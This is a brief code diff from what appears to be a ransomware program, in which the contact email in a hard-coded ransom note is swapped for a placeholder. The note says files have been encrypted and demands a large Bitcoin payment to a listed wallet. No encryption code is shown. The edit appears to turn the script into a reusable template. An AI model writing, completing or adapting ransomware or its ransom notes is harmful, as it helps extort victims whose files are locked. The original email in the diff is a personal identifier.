@@ -9,7 +9,7 @@ RANSOM_NOTE = """
 ======================================================
 All your important files have been encrypted.
 
-To recover them, contact: vanld5@viettel.com.vn
+To recover them, contact: your_mail@gmail.com
 and send $10000000 in Bitcoin to the following wallet:
 
     1ABCDeFgHiJkLmNoPQRstUvWxYz1234567
